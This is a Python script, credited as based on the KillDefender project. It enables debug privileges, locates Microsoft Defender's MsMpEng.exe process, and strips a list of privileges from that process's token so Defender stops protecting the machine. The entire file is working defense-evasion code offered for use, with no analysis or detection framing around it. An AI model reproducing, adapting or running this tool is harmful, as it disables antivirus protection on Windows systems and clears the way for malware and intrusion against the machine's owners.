# Based on Pwn1sher's KillDefender: https://github.com/pwn1sher/KillDefender
import wmi
import win32api
import win32process
import win32security


DEBUG_PROCESS = win32process.DEBUG_PROCESS
TOKEN_QUERY = win32security.TOKEN_QUERY
TOKEN_ADJUST_PRIVILEGES = win32security.TOKEN_ADJUST_PRIVILEGES
TOKEN_ALL_ACCESS = win32security.TOKEN_ALL_ACCESS
SE_PRIVILEGE_ENABLED = win32security.SE_PRIVILEGE_ENABLED
SE_PRIVILEGE_REMOVED = win32security.SE_PRIVILEGE_REMOVED

# NT Defined Privileges

SE_CREATE_TOKEN_NAME              = "SeCreateTokenPrivilege"
SE_ASSIGNPRIMARYTOKEN_NAME        = "SeAssignPrimaryTokenPrivilege"
SE_LOCK_MEMORY_NAME               = "SeLockMemoryPrivilege"
SE_INCREASE_QUOTA_NAME            = "SeIncreaseQuotaPrivilege"
SE_UNSOLICITED_INPUT_NAME         = "SeUnsolicitedInputPrivilege"
SE_MACHINE_ACCOUNT_NAME           = "SeMachineAccountPrivilege"
SE_TCB_NAME                       = "SeTcbPrivilege"
SE_SECURITY_NAME                  = "SeSecurityPrivilege"
SE_TAKE_OWNERSHIP_NAME            = "SeTakeOwnershipPrivilege"
SE_LOAD_DRIVER_NAME               = "SeLoadDriverPrivilege"
SE_SYSTEM_PROFILE_NAME            = "SeSystemProfilePrivilege"
SE_SYSTEMTIME_NAME                = "SeSystemtimePrivilege"
SE_PROF_SINGLE_PROCESS_NAME       = "SeProfileSingleProcessPrivilege"
SE_INC_BASE_PRIORITY_NAME         = "SeIncreaseBasePriorityPrivilege"
SE_CREATE_PAGEFILE_NAME           = "SeCreatePagefilePrivilege"
SE_CREATE_PERMANENT_NAME          = "SeCreatePermanentPrivilege"
SE_BACKUP_NAME                    = "SeBackupPrivilege"
SE_RESTORE_NAME                   = "SeRestorePrivilege"
SE_SHUTDOWN_NAME                  = "SeShutdownPrivilege"
SE_DEBUG_NAME                     = "SeDebugPrivilege"
SE_AUDIT_NAME                     = "SeAuditPrivilege"
SE_SYSTEM_ENVIRONMENT_NAME        = "SeSystemEnvironmentPrivilege"
SE_CHANGE_NOTIFY_NAME             = "SeChangeNotifyPrivilege"
SE_REMOTE_SHUTDOWN_NAME           = "SeRemoteShutdownPrivilege"
SE_IMPERSONATE_NAME               = "SeImpersonatePrivilege"

SECURITY_MANDATORY_UNTRUSTED_RID  = 0x2010
PROCESS_QUERY_LIMITED_INFORMATION = 0x1000


def adjust_privilege_a(priv, enable=1):
    # Get the process token
    flags = TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY
    htoken = win32security.OpenProcessToken(win32api.GetCurrentProcess(), flags)
    # Get the ID for specified privilege
    id = win32security.LookupPrivilegeValue(None, priv)
    # Create a list of privileges to be added
    if enable:
        new_privileges = [(id, SE_PRIVILEGE_ENABLED)]
    else:
        new_privileges = [(id, SE_PRIVILEGE_REMOVED)]
    # Make the adjustment
    win32security.AdjustTokenPrivileges(htoken, 0, new_privileges)

def adjust_privilege_b(priv, pid, enable=1):
    # Get the process token
    flags = TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY
    proc_handle = win32api.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid)
    htoken = win32security.OpenProcessToken(proc_handle, flags)
    # Get the ID for specified privilege
    id = win32security.LookupPrivilegeValue(None, priv)
    # Create a list of privileges to be added
    if enable:
        new_privileges = [(id, SE_PRIVILEGE_ENABLED)]
    else:
        new_privileges = [(id, SE_PRIVILEGE_REMOVED)]
    # Make the adjustment
    win32security.AdjustTokenPrivileges(htoken, 0, new_privileges)

def enable_debug_privilege():
    print("Enabling debug privileges")
    adjust_privilege_a(SE_DEBUG_NAME)
    print("Debug privileges enabled")

def get_all_processes():
    c = wmi.WMI(find_classes=False)
    procs = []
    for i in c.Win32_Process(["Caption", "ProcessID"]):
        procs.append(i)
    return procs

def get_procid_from_name(processname, proc_list):
    for process in proc_list:
        proc_name = process.wmi_property("Caption").value
        proc_id = process.wmi_property("ProcessID").value
        if proc_name == processname:
            return proc_id
        else:
            continue

def get_pid(process_name):
    processes = get_all_processes()
    pid = get_procid_from_name(process_name, processes)
    return pid

def kill_defender():
    print("Attempting to kill defender")
    privs = [
        SE_SECURITY_NAME, 
        SE_CHANGE_NOTIFY_NAME,
        SE_TCB_NAME,
        SE_IMPERSONATE_NAME,
        SE_LOAD_DRIVER_NAME,
        SE_RESTORE_NAME,
        SE_BACKUP_NAME,
        SE_SECURITY_NAME,
        SE_SYSTEM_ENVIRONMENT_NAME,
        SE_INCREASE_QUOTA_NAME,
        SE_TAKE_OWNERSHIP_NAME,
        SE_INC_BASE_PRIORITY_NAME,
        SE_SHUTDOWN_NAME,
        SE_ASSIGNPRIMARYTOKEN_NAME,
    ]
    pid = get_pid("MsMpEng.exe")
    flags = TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY
    proc_handle = win32api.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid)
    htoken = win32security.OpenProcessToken(proc_handle, flags)
    for priv in privs:
        id = win32security.LookupPrivilegeValue(None, priv)
        new_privileges = [(id, SE_PRIVILEGE_REMOVED)]
        win32security.AdjustTokenPrivileges(htoken, 0, new_privileges)
    print("Defender is Dead...")
    
    

def main():
    enable_debug_privilege()
    kill_defender()

if __name__=="__main__":
    main()